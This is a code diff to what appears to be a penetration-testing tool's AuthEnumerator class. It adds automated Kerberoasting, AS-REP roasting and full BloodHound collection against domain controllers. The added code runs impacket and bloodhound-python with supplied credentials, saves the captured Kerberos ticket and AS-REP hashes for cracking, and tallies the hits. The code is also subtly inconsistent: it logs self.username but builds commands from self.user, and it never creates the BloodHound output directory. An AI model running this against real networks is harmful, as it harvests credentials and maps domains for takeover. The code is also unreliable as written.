@@ -39,12 +39,33 @@ class AuthEnumerator:
             self.logger.warning("Neither 'nxc' nor 'netexec' found. Authenticated enumeration will be limited.")
         
         self.has_enum4linux = is_command_available('enum4linux-ng')
+        self.has_kerberoast = is_command_available('impacket-GetUserSPNs')
+        self.has_asrep = is_command_available('impacket-GetNPUsers')
+        self.has_bloodhound = is_command_available('bloodhound-python')
         
         self.logger.info(f"Initialized authenticated enumerator for user: {self.username}")
         if self.local_auth:
             self.logger.info("Using local authentication")
         else:
             self.logger.info("Using domain authentication")
+        
+        # Log tool availability
+        tool_status = []
+        if self.nxc_cmd:
+            tool_status.append(f"NetExec: {self.nxc_cmd}")
+        if self.has_enum4linux:
+            tool_status.append("enum4linux-ng")
+        if self.has_kerberoast:
+            tool_status.append("impacket-GetUserSPNs")
+        if self.has_asrep:
+            tool_status.append("impacket-GetNPUsers")
+        if self.has_bloodhound:
+            tool_status.append("bloodhound-python")
+        
+        if tool_status:
+            self.logger.info(f"Available tools: {', '.join(tool_status)}")
+        else:
+            self.logger.warning("No enumeration tools found!")
     
     async def enumerate_targets(self, ips: List[str]) -> Dict:
         """Perform authenticated enumeration on targets"""
@@ -106,6 +127,21 @@ class AuthEnumerator:
         enum4linux_result = await self._run_enum4linux(ip)
         if enum4linux_result:
             target_result['checks'].append(enum4linux_result)
+        
+        # Kerberoasting attack
+        kerberoast_result = await self._kerberoasting(ip)
+        if kerberoast_result:
+            target_result['checks'].append(kerberoast_result)
+        
+        # AS-REP roasting attack
+        asrep_result = await self._asrep_roasting(ip)
+        if asrep_result:
+            target_result['checks'].append(asrep_result)
+        
+        # BloodHound data collection
+        bloodhound_result = await self._bloodhound_collection(ip)
+        if bloodhound_result:
+            target_result['checks'].append(bloodhound_result)
         
         # If local_auth is enabled, run all checks again with --local-auth
         if self.local_auth:
@@ -389,6 +425,160 @@ class AuthEnumerator:
             self.logger.error(f"enum4linux-ng authenticated scan failed for {ip}: {e}")
             return None
     
+    async def _kerberoasting(self, ip: str) -> Dict:
+        """Perform Kerberoasting attack using impacket-GetUserSPNs"""
+        if not is_command_available('impacket-GetUserSPNs'):
+            self.logger.warning("impacket-GetUserSPNs not found. Skipping Kerberoasting.")
+            return None
+        
+        if not self.domain:
+            self.logger.warning("Domain not specified. Skipping Kerberoasting.")
+            return None
+        
+        cmd = ['impacket-GetUserSPNs', '-request', '-dc-ip', ip, f'{self.domain}/{self.user}:{self.password}']
+        
+        try:
+            self.logger.info(f"Performing Kerberoasting on {ip}")
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            
+            stdout, stderr = await process.communicate()
+            output = stdout.decode() + stderr.decode()
+            
+            # Save results
+            filename = f"kerberoasting_{ip}.txt"
+            file_path = save_enumeration_result(
+                self.output_dir, ip, 'kerberoasting', output, filename,
+                service_type='ldap', authenticated=True
+            )
+            
+            # Check if any SPNs were found
+            spns_found = '$krb5tgs$' in output or 'ServicePrincipalName' in output
+            
+            return {
+                'type': 'kerberoasting',
+                'command': ' '.join(cmd),
+                'output': output,
+                'file': file_path,
+                'spns_found': spns_found,
+                'success': process.returncode == 0
+            }
+            
+        except Exception as e:
+            self.logger.error(f"Kerberoasting failed for {ip}: {e}")
+            return None
+    
+    async def _asrep_roasting(self, ip: str) -> Dict:
+        """Perform AS-REP roasting attack using impacket-GetNPUsers"""
+        if not is_command_available('impacket-GetNPUsers'):
+            self.logger.warning("impacket-GetNPUsers not found. Skipping AS-REP roasting.")
+            return None
+        
+        if not self.domain:
+            self.logger.warning("Domain not specified. Skipping AS-REP roasting.")
+            return None
+        
+        cmd = ['impacket-GetNPUsers', '-request', '-dc-ip', ip, f'{self.domain}/{self.user}:{self.password}']
+        
+        try:
+            self.logger.info(f"Performing AS-REP roasting on {ip}")
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            
+            stdout, stderr = await process.communicate()
+            output = stdout.decode() + stderr.decode()
+            
+            # Save results
+            filename = f"asrep_roasting_{ip}.txt"
+            file_path = save_enumeration_result(
+                self.output_dir, ip, 'asrep_roasting', output, filename,
+                service_type='ldap', authenticated=True
+            )
+            
+            # Check if any vulnerable users were found
+            vulnerable_users = '$krb5asrep$' in output or 'UF_DONT_REQUIRE_PREAUTH' in output
+            
+            return {
+                'type': 'asrep_roasting',
+                'command': ' '.join(cmd),
+                'output': output,
+                'file': file_path,
+                'vulnerable_users': vulnerable_users,
+                'success': process.returncode == 0
+            }
+            
+        except Exception as e:
+            self.logger.error(f"AS-REP roasting failed for {ip}: {e}")
+            return None
+    
+    async def _bloodhound_collection(self, ip: str) -> Dict:
+        """Collect BloodHound data using bloodhound-python"""
+        if not is_command_available('bloodhound-python'):
+            self.logger.warning("bloodhound-python not found. Skipping BloodHound collection.")
+            return None
+        
+        if not self.domain:
+            self.logger.warning("Domain not specified. Skipping BloodHound collection.")
+            return None
+        
+        # Create output directory for BloodHound files
+        bloodhound_dir = os.path.join(self.output_dir, 'bloodhound')
+        
+        cmd = [
+            'bloodhound-python', 
+            '-d', self.domain,
+            '-u', self.user,
+            '-p', self.password,
+            '-ns', ip,
+            '-c', 'all',
+            '--zip'
+        ]
+        
+        try:
+            self.logger.info(f"Collecting BloodHound data from {ip}")
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                cwd=bloodhound_dir
+            )
+            
+            stdout, stderr = await process.communicate()
+            output = stdout.decode() + stderr.decode()
+            
+            # Save command output to bloodhound directory
+            filename = f"bloodhound_collection_{ip}.txt"
+            file_path = save_enumeration_result(
+                self.output_dir, ip, 'bloodhound_collection', output, filename,
+                service_type='bloodhound', authenticated=True
+            )
+            
+            # Check if collection was successful
+            collection_success = 'Done in' in output or '.zip' in output
+            
+            return {
+                'type': 'bloodhound_collection',
+                'command': ' '.join(cmd),
+                'output': output,
+                'file': file_path,
+                'collection_success': collection_success,
+                'output_dir': bloodhound_dir,
+                'success': process.returncode == 0
+            }
+            
+        except Exception as e:
+            self.logger.error(f"BloodHound collection failed for {ip}: {e}")
+            return None
+    
     async def generate_summary(self, results: Dict) -> str:
         """Generate a summary of authenticated enumeration results"""
         if 'error' in results:
@@ -405,6 +595,12 @@ class AuthEnumerator:
             'winrm': [],
             'rdp': [],
             'smb': []
+        }
+        
+        attack_results = {
+            'kerberoasting': [],
+            'asrep_roasting': [],
+            'bloodhound': []
         }
         
         for target_result in results['results']:
@@ -430,6 +626,28 @@ class AuthEnumerator:
                     successful_logins['smb'].append(ip)
                     summary_lines.append(f"  [+] SMB shares accessible")
                 
+                # Handle new attack techniques
+                if check_type == 'kerberoasting':
+                    if check.get('spns_found', False):
+                        attack_results['kerberoasting'].append(ip)
+                        summary_lines.append(f"  [+] Kerberoasting: SPNs found!")
+                    else:
+                        summary_lines.append(f"  [-] Kerberoasting: No SPNs found")
+                
+                if check_type == 'asrep_roasting':
+                    if check.get('vulnerable_users', False):
+                        attack_results['asrep_roasting'].append(ip)
+                        summary_lines.append(f"  [+] AS-REP Roasting: Vulnerable users found!")
+                    else:
+                        summary_lines.append(f"  [-] AS-REP Roasting: No vulnerable users")
+                
+                if check_type == 'bloodhound_collection':
+                    if check.get('collection_success', False):
+                        attack_results['bloodhound'].append(ip)
+                        summary_lines.append(f"  [+] BloodHound: Data collection successful")
+                    else:
+                        summary_lines.append(f"  [-] BloodHound: Data collection failed")
+                
                 if success:
                     summary_lines.append(f"  [+] {check_type}: Success")
                 else:
@@ -449,6 +667,21 @@ class AuthEnumerator:
         
         summary_lines.append(f"SMB access: {len(successful_logins['smb'])} targets")
         for ip in successful_logins['smb']:
+            summary_lines.append(f"  - {ip}")
+        
+        # Attack results summary
+        summary_lines.append("")
+        summary_lines.append("=== ATTACK RESULTS SUMMARY ===")
+        summary_lines.append(f"Kerberoasting hits: {len(attack_results['kerberoasting'])} targets")
+        for ip in attack_results['kerberoasting']:
+            summary_lines.append(f"  - {ip}")
+        
+        summary_lines.append(f"AS-REP Roasting hits: {len(attack_results['asrep_roasting'])} targets")
+        for ip in attack_results['asrep_roasting']:
+            summary_lines.append(f"  - {ip}")
+        
+        summary_lines.append(f"BloodHound collections: {len(attack_results['bloodhound'])} targets")
+        for ip in attack_results['bloodhound']:
             summary_lines.append(f"  - {ip}")
         
         # Save summary to file
